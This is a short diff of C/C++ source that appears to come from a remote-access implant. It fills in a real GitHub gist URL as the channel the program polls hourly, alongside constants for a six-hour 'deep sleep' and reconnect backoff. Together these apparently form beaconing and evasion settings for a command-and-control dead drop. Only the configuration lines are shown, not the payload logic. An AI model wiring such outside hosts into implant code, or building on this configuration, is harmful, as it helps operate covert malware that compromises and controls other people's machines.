@@ -17,7 +17,7 @@
 #pragma comment(lib, "shell32.lib")
 
 // === TIMING CONFIG ===
-const char* GIST_URL = "your gist txt";
+const char* GIST_URL = "https://gist.github.com/HiroyaAkari/5d573a1d2edf92620943edbb08288431.js";
 const int GIST_POLL_MS = 3600000;      // 1 hour
 const int DEEP_SLEEP_MS = 21600000;    // 6 hours
 const int RECONNECT_BASE_MS = 300000;  // 5 minutes
